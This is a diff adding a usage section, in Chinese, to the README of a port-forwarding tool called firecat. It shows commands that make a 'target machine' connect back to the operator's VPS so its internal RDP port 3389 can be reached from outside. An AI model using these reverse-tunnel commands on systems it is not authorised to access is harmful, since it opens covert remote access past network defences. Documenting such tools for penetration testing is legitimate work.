@@ -21,3 +21,16 @@ on Linux
 * 连接器-常规   附加库目录 配置为lib库文件目录
 * 配置属性-常规 平台工具集 vs-xp(可选)
 * 调试时, 在监视1窗口(Watch 1)中输入 $err,hr 获取GetLastError()
+
+
+###如何使用
+
+以转发内网3389端口为例
+
+在你的VPS机器上监听80端口和任意端口（51）
+>firecat -m 0 -t 80 -s 51
+
+在目标机上回连你的VPS
+>firecat -m 1 -h yourvps -t 80 -l localip -s 3389
+
+本地mstsc连接 127.0.0.1:51
